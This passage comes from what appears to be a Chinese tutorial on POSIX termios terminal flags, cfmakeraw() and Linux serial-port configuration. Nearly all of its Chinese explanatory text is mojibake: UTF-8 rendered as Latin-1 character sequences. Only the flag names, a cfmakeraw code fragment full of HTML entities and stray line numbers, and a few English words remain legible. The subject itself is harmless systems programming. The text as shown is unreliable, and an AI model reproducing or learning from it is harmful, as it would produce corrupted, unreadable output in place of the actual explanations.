‡å¿—æœªè®¾ç½®ï¼Œåˆ™æ‰“å¼€ä¸€ä¸ªç»ˆç«¯è®¾å¤‡å¸¸å¸¸ä¼šé˜»å¡åˆ°è°ƒåˆ¶è§£è°ƒå™¨å›åº”ã€‚ CRDLY (c_oflag, SVR4)å›è½¦å»¶è¿Ÿå±è”½ã€‚æ­¤å±è”½çš„å€¼æ˜¯CR0ã€CR1ã€CR2å’ŒCR3ã€‚ CREAD (c_cflag, POSIX.1)å¦‚è‹¥è®¾ç½®ï¼Œåˆ™æ¥æ”¶è£…ç½®è¢«å¯ç”¨ï¼Œå¯ä»¥æ¥æ”¶å­—ç¬¦ã€‚ CRTS_IFLOW (c_cflag, 4.3+BSD)è¾“å…¥çš„RTSæµæ§åˆ¶ã€‚ CSIZE (c_cflag, POSIX.1)æ­¤å­—æ®µæ˜¯ä¸€ä¸ªå±è”½æ ‡å¿—ï¼Œå®ƒæŒ‡æ˜å‘é€å’Œæ¥æ”¶çš„æ¯ä¸ªå­—èŠ‚çš„ä½æ•°ã€‚æ­¤é•¿åº¦ä¸åŒ…æ‹¬å¯èƒ½æœ‰çš„å¥‡å¶æ ¡éªŒä½ã€‚ç”±æ­¤å±è”½å®šä¹‰çš„å­—æ®µå€¼æ˜¯CS5ã€CS6ã€CS7å’ŒCS8ï¼Œåˆ†åˆ«è¡¨ç¤ºæ¯ä¸ªå­—èŠ‚åŒ…å«5ã€6ã€7å’Œ8ä½ã€‚ CSTOPB (c_cflag, POSIX.1)å¦‚è‹¥è®¾ç½®ï¼Œåˆ™ä½¿ç”¨ä¸¤ä½ä½œä¸ºåœæ­¢ä½ï¼Œå¦åˆ™åªä½¿ç”¨ä¸€ä½ä½œä¸ºåœæ­¢ä½ã€‚ ECHO (c_lflag, POSIX.1)å¦‚è‹¥è®¾ç½®ï¼Œåˆ™å°†è¾“å…¥å­—ç¬¦å›é€åˆ°ç»ˆç«¯è®¾å¤‡ã€‚åœ¨è§„èŒƒæ–¹å¼å’Œéè§„èŒƒæ–¹å¼ä¸‹éƒ½å¯ä»¥å›é€å­—ç¬¦ã€‚ ECHOCTL (c_lflag, SVR4å’Œ4.3+BSD)å¦‚è‹¥è®¾ç½®å¹¶ä¸”ECHOä¹Ÿè®¾ç½®ï¼Œåˆ™é™¤ASCII TABã€ASCII NLã€STARTå’ŒSTOPå­—ç¬¦å¤–ï¼Œå…¶ä»–ASCIIæ§åˆ¶ç¬¦(ASCIIå­—ç¬¦é›†ä¸­çš„0ï½037)éƒ½è¢«å›é€ä¸º^Xï¼Œå…¶ä¸­ï¼ŒXæ˜¯ç›¸åº”æ§åˆ¶å­—ç¬¦ä»£ç å€¼åŠ 0100æ‰€æ„æˆçš„å­—ç¬¦ã€‚è¿™å°±æ„å‘³ç€ASCII Ctrl-Aå­—ç¬¦(01)è¢«å›é€ä¸º^Aã€‚ASCII DELETEå­—ç¬¦(0177)åˆ™å›é€ä¸º^?ã€‚å¦‚è‹¥æ­¤æ ‡å¿—æœªè®¾ç½®ï¼Œåˆ™ASCIIæ§åˆ¶å­—ç¬¦æŒ‰å…¶åŸæ ·å›é€ã€‚å¦‚åŒECHOæ ‡å¿—ï¼Œåœ¨è§„èŒƒæ–¹å¼å’Œéè§„èŒƒæ–¹å¼ä¸‹æ­¤æ ‡å¿—å¯¹æ§åˆ¶å­—ç¬¦å›é€éƒ½èµ·ä½œç”¨ã€‚åº”å½“äº†è§£çš„æ˜¯ï¼ŒæŸäº›ç³»ç»Ÿå›é€EOFå­—ç¬¦äº§ç”Ÿçš„ä½œç”¨æœ‰æ‰€ä¸åŒï¼Œå…¶åŸå› æ˜¯EOFçš„å…¸å‹å€¼æ˜¯Ctrl-Dï¼Œè€Œè¿™æ˜¯ASCII EOTå­—ç¬¦ï¼Œå®ƒå¯èƒ½ä½¿æŸäº›ç»ˆç«¯æŒ‚æ–­ã€‚ ECHOE (c_lflag, POSIX.1)å¦‚è‹¥è®¾ç½®å¹¶ä¸”ICANONä¹Ÿè®¾ç½®ï¼Œåˆ™ERASEå­—ç¬¦ä»æ˜¾ç¤ºä¸­æ“¦é™¤å½“å‰è¡Œä¸­çš„æœ€åä¸€ä¸ªå­—ç¬¦ã€‚è¿™é€šå¸¸æ˜¯åœ¨ç»ˆç«¯é©±åŠ¨ç¨‹åºä¸­å†™ä¸‰ä¸ªå­—ç¬¦åºåˆ—ï¼šé€€æ ¼ï¼Œç©ºæ ¼ï¼Œé€€æ ¼å®ç°çš„ã€‚å¦‚è‹¥æ”¯æŒWERASEå­—ç¬¦ï¼Œåˆ™ECHOEç”¨ä¸€ä¸ªæˆ–è‹¥å¹²ä¸ªä¸Šè¿°ä¸‰å­—ç¬¦åºåˆ—æ“¦é™¤å‰ä¸€ä¸ªå­—ã€‚å¦‚è‹¥æ”¯æŒECHOPRTæ ‡å¿—ï¼Œåˆ™åœ¨è¿™é‡Œæ‰€è¯´æ˜çš„ECHOEåŠ¨ä½œå‡å®šECHOPRTæ ‡å¿—æ²¡æœ‰è®¾ç½®ã€‚ ECHOK (c_lflag, POSIX.1)å¦‚è‹¥è®¾ç½®å¹¶ä¸”ICANONä¹Ÿè®¾ç½®ï¼Œåˆ™KILLå­—ç¬¦ä»æ˜¾ç¤ºä¸­æ“¦é™¤å½“å‰è¡Œï¼Œæˆ–è€…è¾“å‡ºNLå­—ç¬¦(ç”¨ä»¥å¼ºè°ƒå·²æ“¦é™¤æ•´ä¸ªè¡Œ)ã€‚å¦‚è‹¥æ”¯æŒECHOKEæ ‡å¿—ï¼Œåˆ™è¿™é‡Œçš„è¯´æ˜å‡å®šECHOKEæ ‡å¿—æ²¡æœ‰è®¾ç½®ã€‚ ECHOKE (c_lflag, SVR4å’Œ4.3+BSD)å¦‚è‹¥è®¾ç½®å¹¶ä¸”ICANONä¹Ÿè®¾ç½®ï¼Œåˆ™å›é€KILLå­—ç¬¦çš„æ–¹å¼æ˜¯æ“¦å»è¡Œä¸­çš„æ¯ä¸€ä¸ªå­—ç¬¦ã€‚æ“¦é™¤æ¯ä¸ªå­—ç¬¦çš„æ–¹æ³•åˆ™ç”±ECHOEå’ŒECHOPRTæ ‡å¿—é€‰æ‹©ã€‚ ECHONL (c_lflag, POSIX.1)å¦‚è‹¥è®¾ç½®å¹¶ä¸”ICANONä¹Ÿè®¾ç½®ï¼Œå³ä½¿æ²¡æœ‰è®¾ç½®ECHOä¹Ÿå›é€NLå­—ç¬¦ã€‚ ECHOPRT (c_lflag, SVR4å’Œ4.3+BSD)å¦‚è‹¥è®¾ç½®å¹¶ä¸”ICANONå’ŒECHOä¹Ÿéƒ½è®¾ç½®ï¼Œåˆ™ERASEå­—ç¬¦(ä»¥åŠWERASEå­—ç¬¦ï¼Œè‹¥å—åˆ°æ”¯æŒ)ä½¿æ‰€æœ‰æ­£è¢«æ“¦é™¤çš„å­—ç¬¦æŒ‰å®ƒä»¬è¢«æ“¦é™¤çš„æ–¹å¼æ‰“å°ã€‚åœ¨ç¡¬æ‹·è´ç»ˆç«¯ä¸Šè¿™å¸¸å¸¸æ˜¯æœ‰ç”¨çš„ï¼Œè¿™æ ·å¯ä»¥ç¡®åˆ‡åœ°çœ‹åˆ°å“ªäº›å­—ç¬¦æ­£è¢«æ“¦å»ã€‚ FFDLY (c_oflag, SVR4)æ¢é¡µå»¶è¿Ÿå±è”½ã€‚æ­¤å±è”½æ ‡å¿—å€¼æ˜¯FF0æˆ–FF1ã€‚ FLUSHO (c_lflag, SVR4å’Œ4.3+BSD)å¦‚è‹¥è®¾ç½®ï¼Œåˆ™åˆ·æ¸…è¾“å‡ºã€‚å½“é”®å…¥DISCARDå­—ç¬¦æ—¶è®¾ç½®æ­¤æ ‡å¿—ï¼Œå½“é”®å…¥å¦ä¸€ä¸ªDISCARDå­—ç¬¦æ—¶ï¼Œæ­¤æ ‡å¿—è¢«æ¸…é™¤ã€‚è®¾ç½®æˆ–æ¸…é™¤æ­¤ç»ˆç«¯æ ‡å¿—ä¹Ÿå¯è®¾ç½®æˆ–æ¸…é™¤æ­¤æ¡ä»¶ã€‚ HUPCL (c_cflag, POSIX.1)å¦‚è‹¥è®¾ç½®ï¼Œåˆ™å½“æœ€åä¸€ä¸ªè¿›ç¨‹å…³é—­æ­¤è®¾å¤‡æ—¶ï¼Œè°ƒåˆ¶è§£è°ƒå™¨æ§åˆ¶çº¿é™è‡³ä½ç”µå¹³(ä¹Ÿå°±æ˜¯è°ƒåˆ¶è§£è°ƒå™¨çš„è¿æ¥æ–­å¼€)ã€‚ ICANON (c_lflag, POSIX.1)å¦‚è‹¥è®¾ç½®ï¼Œåˆ™æŒ‰è§„èŒƒæ–¹å¼å·¥ä½œã€‚è¿™ä½¿ä¸‹åˆ—å­—ç¬¦èµ·ä½œç”¨ï¼šEOFã€EOLã€EOL2ã€ERASEã€KILLã€REPRINTã€STATUSå’ŒWERASEã€‚è¾“å…¥å­—ç¬¦è¢«è£…é…æˆè¡Œã€‚å¦‚æœä¸ä»¥è§„èŒƒæ–¹å¼å·¥ä½œï¼Œåˆ™è¯»è¯·æ±‚ç›´æ¥ä»è¾“å…¥é˜Ÿåˆ—å–å­—ç¬¦ã€‚åœ¨è‡³å°‘æ¥åˆ°MINä¸ªå­—èŠ‚æˆ–å·²è¶…è¿‡TIMEå€¼ä¹‹å‰ï¼Œreadå°†ä¸è¿”å›ã€‚ ICRNL (c_iflag, POSIX.1)å¦‚è‹¥è®¾ç½®å¹¶ä¸”IGNCRæœªè®¾ç½®ï¼Œå³å°†æ¥æ”¶åˆ°çš„CRå­—ç¬¦è½¬æ¢æˆä¸€ä¸ªNLå­—ç¬¦ã€‚ IEXTEN (c_lflag, POSIX.1)å¦‚è‹¥è®¾ç½®ï¼Œåˆ™è¯†åˆ«å¹¶å¤„ç†æ‰©å……çš„ã€å®ç°å®šä¹‰çš„ç‰¹æ®Šå­—ç¬¦ã€‚ IGNBRK (c_iflag, POSIX.1)åœ¨è®¾ç½®æ—¶ï¼Œå¿½ç•¥è¾“å…¥ä¸­çš„BREAKæ¡ä»¶ã€‚å…³äºBREAKæ¡ä»¶æ˜¯äº§ç”Ÿä¿¡å·è¿˜æ˜¯è¢«è¯»ä½œä¸ºæ•°æ®ï¼Œè¯·è§BRKINTã€‚ IGNCR (c_iflag, POSIX.1)å¦‚è‹¥è®¾ç½®ï¼Œå¿½ç•¥æ¥æ”¶åˆ°çš„CRå­—ç¬¦ã€‚è‹¥æ­¤æ ‡å¿—æœªè®¾ç½®ï¼Œè€Œè®¾ç½®äº†ICRNLæ ‡å¿—åˆ™å°†æ¥æ”¶åˆ°çš„CRå­—ç¬¦è½¬æ¢æˆä¸€ä¸ªNLå­—ç¬¦ã€‚ IGNPAR (c_iflag, POSIX.1)åœ¨è®¾ç½®æ—¶ï¼Œå¿½ç•¥å¸¦æœ‰ç»“æ„é”™è¯¯(éBREAK)æˆ–å¥‡å¶é”™çš„è¾“å…¥å­—èŠ‚ã€‚ IMAXBEL (c_iflag, SVR4å’Œ4.3+BSD)å½“è¾“å…¥é˜Ÿåˆ—æ»¡æ—¶å“é“ƒã€‚ INLCR (c_iflag, POSIX.1)å¦‚è‹¥è®¾ç½®ï¼Œåˆ™æ¥æ”¶åˆ°çš„NLå­—ç¬¦è½¬æ¢æˆCRå­—ç¬¦ã€‚ INPCK (c_iflag, POSIX.1)å½“è®¾ç½®æ—¶ï¼Œä½¿è¾“å…¥å¥‡å¶æ ¡éªŒèµ·ä½œç”¨ã€‚å¦‚è‹¥æœªè®¾ç½®INPCKï¼Œåˆ™ä½¿è¾“å…¥å¥‡å¶æ ¡éªŒä¸èµ·ä½œç”¨ã€‚å¥‡å¶â€œäº§ç”Ÿå’Œæ£€æµ‹â€å’Œâ€œè¾“å…¥å¥‡å¶æ€§æ£€éªŒâ€æ˜¯ä¸åŒçš„ä¸¤ä»¶äº‹ã€‚å¥‡å¶ä½çš„äº§ç”Ÿå’Œæ£€æµ‹æ˜¯ç”±PARENBæ ‡å¿—æ§åˆ¶çš„ã€‚è®¾ç½®è¯¥æ ‡å¿—åä½¿ä¸²è¡Œç•Œé¢çš„è®¾å¤‡é©±åŠ¨ç¨‹åºå¯¹è¾“å‡ºå­—ç¬¦äº§ç”Ÿå¥‡å¶ä½ï¼Œå¯¹è¾“å…¥å­—ç¬¦åˆ™éªŒè¯å…¶å¥‡å¶æ€§ã€‚æ ‡å¿—PARODDå†³å®šè¯¥å¥‡å¶æ€§åº”å½“æ˜¯å¥‡è¿˜æ˜¯å¶ã€‚å¦‚æœä¸€ä¸ªå…¶å¥‡å¶æ€§ä¸ºé”™çš„å­—ç¬¦å·²ç»æ¥åˆ°ï¼Œåˆ™æ£€æŸ¥INPCKæ ‡å¿—çš„çŠ¶æ€ã€‚è‹¥æ­¤æ ‡å¿—å·²è®¾ç½®ï¼Œåˆ™æ£€æŸ¥IGNPARæ ‡å¿—(ä»¥å†³å®šæ˜¯å¦åº”å¿½ç•¥å¸¦å¥‡å¶é”™çš„è¾“å…¥å­—èŠ‚)ï¼Œè‹¥ä¸åº”å¿½ç•¥æ­¤è¾“å…¥å­—èŠ‚ï¼Œåˆ™æ£€æŸ¥PARMRKæ ‡å¿—ä»¥å†³å®šå‘è¯»è¿›ç¨‹åº”ä¼ é€é‚£ç§å­—ç¬¦ã€‚ ISIG (c_lflag, POSIX.1)å¦‚è‹¥è®¾ç½®ï¼Œåˆ™åˆ¤åˆ«è¾“å…¥å­—ç¬¦æ˜¯å¦æ˜¯è¦äº§ç”Ÿç»ˆç«¯ä¿¡å·çš„ç‰¹æ®Šå­—ç¬¦(INTRï¼ŒQUITï¼ŒSUSPå’ŒDSUSP)ï¼Œè‹¥æ˜¯ï¼Œåˆ™äº§ç”Ÿç›¸åº”ä¿¡å·ã€‚ ISTRIP (c_iflag, POSIX.1)å½“è®¾ç½®æ—¶ï¼Œæœ‰æ•ˆè¾“å…¥å­—èŠ‚è¢«å‰¥ç¦»ä¸º7ä½ã€‚å½“æ­¤æ ‡å¿—æœªè®¾ç½®æ—¶ï¼Œåˆ™ä¿ç•™å…¨éƒ¨8ä½ã€‚ IUCLC (c_iflag, SVR4)å°†è¾“å…¥çš„å¤§å†™å­—ç¬¦æ˜ å°„ä¸ºå°å†™å­—ç¬¦ã€‚ IXANY (c_iflag, SVR4å’Œ4.3+BSD)ä½¿ä»»ä¸€å­—ç¬¦éƒ½èƒ½é‡æ–°èµ·åŠ¨è¾“å‡ºã€‚ IXOFF (c_iflag, POSIX.1)å¦‚è‹¥è®¾ç½®ï¼Œåˆ™ä½¿èµ·åŠ¨-åœæ­¢è¾“å…¥æ§åˆ¶èµ·ä½œç”¨ã€‚å½“ç»ˆç«¯é©±åŠ¨ç¨‹åºå‘ç°è¾“å…¥é˜Ÿåˆ—å°†è¦å¡«æ»¡æ—¶ï¼Œè¾“å‡ºä¸€ä¸ªSTOPå­—ç¬¦ã€‚æ­¤å­—ç¬¦åº”å½“ç”±å‘é€æ•°æ®çš„è®¾å¤‡è¯†åˆ«ï¼Œå¹¶ä½¿è¯¥è®¾å¤‡æš‚åœã€‚æ­¤åï¼Œå½“å·²å¯¹è¾“å…¥é˜Ÿåˆ—ä¸­çš„å­—ç¬¦è¿›è¡Œäº†å¤„ç†åï¼Œè¯¥ç»ˆç«¯é©±åŠ¨ç¨‹åºå°†è¾“å‡ºä¸€ä¸ªSTARTå­—ç¬¦ï¼Œä½¿è¯¥è®¾å¤‡æ¢å¤å‘é€æ•°æ®ã€‚ IXON (c_iflag, POSIX.1)å¦‚è‹¥è®¾ç½®ï¼Œåˆ™ä½¿èµ·åŠ¨-åœæ­¢è¾“å‡ºæ§åˆ¶èµ·ä½œç”¨ã€‚å½“ç»ˆç«¯é©±åŠ¨ç¨‹åºæ¥æ”¶åˆ°ä¸€ä¸ªSTOPå­—ç¬¦æ—¶ï¼Œè¾“å‡ºæš‚åœã€‚åœ¨è¾“å‡ºæš‚åœæ—¶ï¼Œä¸‹ä¸€ä¸ªSTARTå­—ç¬¦æ¢å¤è¾“å‡ºã€‚å¦‚è‹¥æœªè®¾ç½®æ­¤æ ‡å¿—ï¼Œåˆ™STARTå’ŒSTOPå­—ç¬¦ç”±è¿›ç¨‹è¯»ä½œä¸ºä¸€èˆ¬å­—ç¬¦ã€‚ MDMBUF (c_cflag, 4.3+BSD)æŒ‰ç…§è°ƒåˆ¶è§£è°ƒå™¨çš„è½½æ³¢æ ‡å¿—è¿›è¡Œè¾“å‡ºæµæ§åˆ¶ã€‚ NLDLY (c_oflag, SVR4)æ–°è¡Œå»¶è¿Ÿå±è”½ã€‚æ­¤å±è”½çš„å€¼æ˜¯NL0å’ŒNL1ã€‚ NOFLSH (c_lflag, POSIX.1)æŒ‰ç³»ç»Ÿé»˜è®¤ï¼Œå½“ç»ˆç«¯é©±åŠ¨ç¨‹åºäº§ç”ŸSIGINTå’ŒSIGQUITä¿¡å·æ—¶ï¼Œè¾“å…¥ã€å‡ºé˜Ÿåˆ—éƒ½è¢«åˆ·æ–°ã€‚å¦å¤–ï¼Œå½“å®ƒäº§ç”ŸSIGSUSPä¿¡å·æ—¶ï¼Œè¾“å…¥é˜Ÿåˆ—è¢«åˆ·æ–°ã€‚å¦‚è‹¥è®¾ç½®äº†NOFLSHæ ‡å¿—ï¼Œåˆ™åœ¨è¿™äº›ä¿¡å·äº§ç”Ÿæ—¶ï¼Œä¸å¯¹è¾“å…¥ã€å‡ºé˜Ÿåˆ—è¿›è¡Œåˆ·æ–°ã€‚ NOKERNINFO (c_lflag, 4.3+BSD)å½“è®¾ç½®æ—¶ï¼Œæ­¤æ ‡å¿—é˜»æ­¢STATUSå­—ç¬¦ä½¿å‰å°è¿›ç¨‹ç»„çš„çŠ¶æ€ä¿¡æ¯æ˜¾ç¤ºåœ¨ç»ˆç«¯ä¸Šã€‚ä½†æ˜¯ä¸è®ºæœ¬æ ‡å¿—æ˜¯å¦è®¾ç½®ï¼ŒSTATUSå­—ç¬¦ä½¿SIGINFOä¿¡å·é€è‡³å‰å°è¿›ç¨‹ç»„ä¸­çš„æ‰€æœ‰è¿›ç¨‹ã€‚ OCRNL (c_oflag, SVR4)å¦‚è‹¥è®¾ç½®ï¼Œå°†è¾“å‡ºçš„CRå­—ç¬¦æ˜ ç…§ä¸ºNLã€‚ OFDEL (c_oflag, SVR4)å¦‚è‹¥è®¾ç½®ï¼Œåˆ™è¾“å‡ºå¡«å……å­—ç¬¦æ˜¯ASCII DELï¼Œå¦åˆ™å®ƒæ˜¯ASCII NULï¼Œè§OFILLæ ‡å¿—ã€‚ OFILL (c_oflag, SVR4)å¦‚è‹¥è®¾ç½®ï¼Œåˆ™ä¸ºå®ç°å»¶è¿Ÿï¼Œå‘é€å¡«å……å­—ç¬¦(ASCII DELæˆ–ASCII NULï¼Œè§OFDELæ ‡å¿—)ï¼Œè€Œä¸ä½¿ç”¨æ—¶é—´å»¶è¿Ÿã€‚è§6ä¸ªå»¶è¿Ÿå±è”½ï¼šBSDLYï¼ŒCRDLYï¼ŒFFDLYï¼ŒNLDLYï¼ŒTABDLYä»¥åŠVTDLYã€‚ OLCUC (c_oflag, SVR4)å¦‚è‹¥è®¾ç½®ï¼Œå°†å°å†™å­—ç¬¦æ˜ å°„ä¸ºå¤§å†™ã€‚ ONLCR (c_oflag, SVR4å’Œ4.3+BSD)å¦‚è‹¥è®¾ç½®ï¼Œå°†è¾“å‡ºçš„NLå­—ç¬¦æ˜ ç…§ä¸ºCR-NLã€‚ ONLRET (c_oflag, SVR4)å¦‚è‹¥è®¾ç½®ï¼Œåˆ™è¾“å‡ºçš„NLå­—ç¬¦å°†æ‰§è¡Œå›è½¦åŠŸèƒ½ã€‚ ONOCR (c_oflag, SVR4)å¦‚è‹¥è®¾ç½®ï¼Œåˆ™åœ¨0åˆ—ä¸è¾“å‡ºCRã€‚ ONOEOT (c_oflag, 4.3+BSD)å¦‚è‹¥è®¾ç½®ï¼Œåˆ™åœ¨è¾“å‡ºä¸­åˆ é™¤EOTå­—ç¬¦(^D)ã€‚åœ¨å°†Ctrl-Dè§£é‡Šä¸ºæŒ‚æ–­çš„ç»ˆç«¯ä¸Šè¿™å¯èƒ½æ˜¯éœ€è¦çš„ã€‚ OPOST (c_oflag, POSIX.1)å¦‚è‹¥è®¾ç½®ï¼Œåˆ™è¿›è¡Œå®ç°å®šä¹‰çš„è¾“å‡ºå¤„ç†ã€‚ OXTABS (c_oflag, 4.3+BSD)å¦‚è‹¥è®¾ç½®ï¼Œåˆ¶è¡¨ç¬¦åœ¨è¾“å‡ºä¸­è¢«æ‰©å±•ä¸ºç©ºæ ¼ã€‚è¿™ä¸å°†æ°´å¹³åˆ¶è¡¨å»¶è¿Ÿ(TABDLY)è®¾ç½®ä¸ºXTABSæˆ–TAB3äº§ç”ŸåŒæ ·æ•ˆæœã€‚ PARENB (c_cflag, POSIX.1)å¦‚è‹¥è®¾ç½®ï¼Œåˆ™å¯¹è¾“å‡ºå­—ç¬¦äº§ç”Ÿå¥‡å¶ä½ï¼Œå¯¹è¾“å…¥å­—ç¬¦åˆ™æ‰§è¡Œå¥‡å¶æ€§æ£€éªŒã€‚è‹¥PARODDå·²è®¾ç½®ï¼Œåˆ™å¥‡å¶æ ¡éªŒæ˜¯å¥‡æ ¡éªŒï¼Œå¦åˆ™æ˜¯å¶æ ¡éªŒã€‚ä¹Ÿè§INPCKã€IGNPARå’ŒPARMRKæ ‡å¿—éƒ¨åˆ†ã€‚ PARMRK (c_iflag, POSIX.1)ï¼Œå½“è®¾ç½®æ—¶ï¼Œå¹¶ä¸”IGNPARæœªè®¾ç½®ï¼Œåˆ™ç»“æ„æ€§é”™(éBREAK)å’Œå¥‡å¶é”™çš„å­—èŠ‚ç”±è¿›ç¨‹è¯»ä½œä¸ºä¸‰ä¸ªå­—ç¬¦åºåˆ—/377, /0å’ŒXï¼Œå…¶ä¸­Xæ˜¯æ¥æ”¶åˆ°çš„å…·æœ‰é”™è¯¯çš„å­—èŠ‚ã€‚å¦‚è‹¥ISTRIPæœªè®¾ç½®ï¼Œåˆ™ä¸€ä¸ªæœ‰æ•ˆçš„/377è¢«ä¼ é€ç»™è¿›ç¨‹æ—¶ä¸º/377ï¼Œ/377ã€‚å¦‚è‹¥IGNPARå’ŒPARMRKéƒ½æœªè®¾ç½®ï¼Œåˆ™ç»“æ„æ€§é”™å’Œå¥‡å¶é”™çš„å­—èŠ‚éƒ½è¢«è¯»ä½œä¸ºä¸€ä¸ªå­—ç¬¦/0ã€‚ PARODD (c_cflag, POSIX.1)å¦‚è‹¥è®¾ç½®ï¼Œåˆ™è¾“å‡ºå’Œè¾“å…¥å­—ç¬¦çš„å¥‡å¶æ€§éƒ½æ˜¯å¥‡ï¼Œå¦åˆ™ä¸ºå¶ã€‚æ³¨æ„ï¼ŒPARENBæ ‡å¿—æ§åˆ¶å¥‡å¶æ€§çš„äº§ç”Ÿå’Œæ£€æµ‹ã€‚ PENDIN (c_lflag, SVR4å’Œ4.3+BSD)å¦‚è‹¥è®¾ç½®ï¼Œåˆ™åœ¨ä¸‹ä¸€ä¸ªå­—ç¬¦è¾“å…¥æ—¶ï¼Œå°šæœªè¯»çš„ä»»ä½•è¾“å…¥éƒ½ç”±ç³»ç»Ÿé‡æ–°æ‰“å°ã€‚è¿™ä¸€åŠ¨ä½œä¸é”®å…¥REPRINTå­—ç¬¦æ—¶çš„ä½œç”¨ç›¸ç±»ä¼¼ã€‚ TABDLY (c_oflag, SVR4)æ°´å¹³åˆ¶è¡¨å»¶è¿Ÿå±è”½ã€‚æ­¤å±è”½çš„å€¼æ˜¯TAB0ã€TAB1ã€TAB2æˆ–TAB3ã€‚XTABSçš„å€¼ç­‰äºTAB3ã€‚æ­¤å€¼ä½¿ç³»ç»Ÿå°†åˆ¶è¡¨ç¬¦æ‰©å±•æˆç©ºæ ¼ã€‚ç³»ç»Ÿå‡å®šåˆ¶è¡¨ç¬¦æ‰€æ‰©å±•çš„ç©ºæ ¼æ•°åˆ°å±å¹•ä¸Šæœ€è¿‘ä¸€ä¸ª8çš„å€æ•°å¤„ä¸ºæ­¢ã€‚ä¸èƒ½æ›´æ”¹æ­¤å‡å®šã€‚ TOSTOP (c_lflag, POSIX.1)å¦‚è‹¥è®¾ç½®ï¼Œå¹¶ä¸”è¯¥å®ç°æ”¯æŒä½œä¸šæ§åˆ¶ï¼Œåˆ™å°†ä¿¡å·SIGTTOUé€åˆ°è¯•å›¾ä¸æ§åˆ¶ç»ˆç«¯çš„ä¸€ä¸ªåå°è¿›ç¨‹çš„è¿›ç¨‹ç»„ã€‚æŒ‰é»˜è®¤ï¼Œæ­¤ä¿¡å·æš‚åœè¯¥è¿›ç¨‹ç»„ä¸­æ‰€æœ‰è¿›ç¨‹ã€‚å¦‚æœå†™æ§åˆ¶ç»ˆç«¯çš„è¿›ç¨‹å¿½ç•¥æˆ–é˜»å¡æ­¤ä¿¡å·ï¼Œåˆ™ç»ˆç«¯é©±åŠ¨ç¨‹åºä¸äº§ç”Ÿæ­¤ä¿¡å·ã€‚ VTDLY (c_oflag, SVR4)å‚ç›´åˆ¶è¡¨å»¶è¿Ÿå±è”½ã€‚æ­¤å±è”½çš„å€¼æ˜¯VT0æˆ–VT1ã€‚ XCASE (c_lflag, SVR4)å¦‚è‹¥è®¾ç½®ï¼Œå¹¶ä¸”ICANONä¹Ÿè®¾ç½®ï¼Œåˆ™è®¤ä¸ºç»ˆç«¯æ˜¯å¤§å†™ç»ˆç«¯ï¼Œæ‰€ä»¥è¾“å…¥éƒ½å˜æ¢ä¸ºå°å†™ã€‚ä¸ºäº†è¾“å…¥ä¸€ä¸ªå¤§å†™å­—ç¬¦ï¼Œåœ¨å…¶å‰åŠ ä¸€ä¸ª/ã€‚ä¸ä¹‹ç±»ä¼¼ï¼Œè¾“å‡ºä¸€ä¸ªå¤§å†™å­—ç¬¦ä¹Ÿåœ¨å…¶å‰åŠ ä¸€ä¸ª/(è¿™ä¸€æ ‡å¿—å·²ç»è¿‡æ—¶ï¼Œç°åœ¨å‡ ä¹æ‰€æœ‰ç»ˆç«¯éƒ½æ”¯æŒå¤§ã€å°å†™å­—ç¬¦)ã€‚ cfmakeraw()cfmakeraw sets the terminal attributes as follows:12345termios_p-&gt;c_iflag &amp;= ~(IGNBRK|BRKINT|PARMRK|ISTRIP|INLCR|IGNCR|ICRNL|IXON);termios_p-&gt;c_oflag &amp;= ~OPOST;termios_p-&gt;c_lflag &amp;= ~(ECHO|ECHONL|ICANON|ISIG|IEXTEN);termios_p-&gt;c_cflag &amp;= ~(CSIZE|PARENB);termios_p-&gt;c_cflag |= CS8; å°±æ˜¯å°†ç»ˆç«¯è®¾ç½®ä¸ºåŸå§‹æ¨¡å¼ï¼Œè¯¥æ¨¡å¼ä¸‹æ‰€æœ‰çš„è¾“å…¥æ•°æ®ä»¥å­—èŠ‚ä¸ºå•ä½è¢«å¤„ç†ã€‚åœ¨åŸå§‹æ¨¡å¼ä¸‹ï¼Œç»ˆç«¯æ˜¯ä¸å¯å›æ˜¾çš„ï¼Œè€Œä¸”æ‰€æœ‰ç‰¹å®šçš„ç»ˆç«¯è¾“å…¥/è¾“å‡ºæ¨¡å¼ä¸å¯ç”¨ã€‚ POSIXç»ˆç«¯æ¥å£å¾ˆå¤šç³»ç»Ÿéƒ½æ”¯æŒPOSIXç»ˆç«¯ï¼ˆä¸²å£ï¼‰æ¥å£ã€‚ç¨‹åºå¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¥å£æ¥æ”¹å˜ç»ˆç«¯çš„å‚æ•°ï¼Œæ¯”å¦‚ï¼Œæ³¢ç‰¹ç‡ï¼Œå­—ç¬¦å¤§å°ç­‰ç­‰ã€‚è¦ä½¿ç”¨è¿™ä¸ªç«¯å£çš„è¯ï¼Œä½ å¿…é¡»å°†å¤´æ–‡ä»¶åŒ…å«åˆ°ä½ çš„ç¨‹åºä¸­ã€‚è¿™ä¸ªå¤´æ–‡ä»¶ä¸­å®šä¹‰äº†ç»ˆç«¯æ§åˆ¶ç»“æ„ä½“å’ŒPOSIXæ§åˆ¶å‡½æ•°ã€‚ ä¸ä¸²å£æ“ä½œç›¸å…³çš„æœ€é‡è¦çš„ä¸¤ä¸ªPOSIXå‡½æ•°å¯èƒ½å°±æ˜¯tcgetattr()å’Œtcsetattr()ã€‚é¡¾åæ€ä¹‰ï¼Œè¿™ä¸¤ä¸ªå‡½æ•°åˆ†åˆ«ç”¨æ¥å–å¾—è®¾è®¾ç½®ç»ˆç«¯çš„å±æ€§ã€‚ 1ã€linuxä¸­çš„ä¸²å£è®¾å¤‡æ–‡ä»¶å­˜æ”¾äº/devç›®å½•ä¸‹ï¼Œå…¶ä¸­ ä¸²å£ä¸€ï¼Œä¸²å£äºŒå¯¹åº”è®¾å¤‡åä¾æ¬¡ä¸º â€œ/dev/ttyS0â€ã€â€œ/dev/ttyS1â€ã€‚åœ¨linuxä¸‹æ“ä½œä¸²å£ä¸æ“ä½œæ–‡ä»¶ç›¸åŒã€‚ 2ã€åœ¨ä½¿ç”¨ä¸²å£ä¹‹å‰å¿…é¡»è®¾ç½®ç›¸å…³é…ç½®ï¼ŒåŒ…æ‹¬ï¼šæ³¢ç‰¹ç‡ã€ æ•°æ®ä½ã€æ ¡éªŒä½ã€åœæ­¢ä½ç­‰ã€‚ä¸²å£è®¾ç½®ç”±termiosç»“æ„ä½“å®ç°ã€‚ å¸¸ç”¨çš„ä¸²å£æ§åˆ¶å‡½æ•°ï¼š 123456Tcgetattr å–å±æ€§(termios ç»“æ„)Tcsetattr è®¾ç½®å±æ€§(termios ç»“æ„)cfgetispeed å¾—åˆ°è¾“å…¥é€Ÿåº¦Cfgetospeed 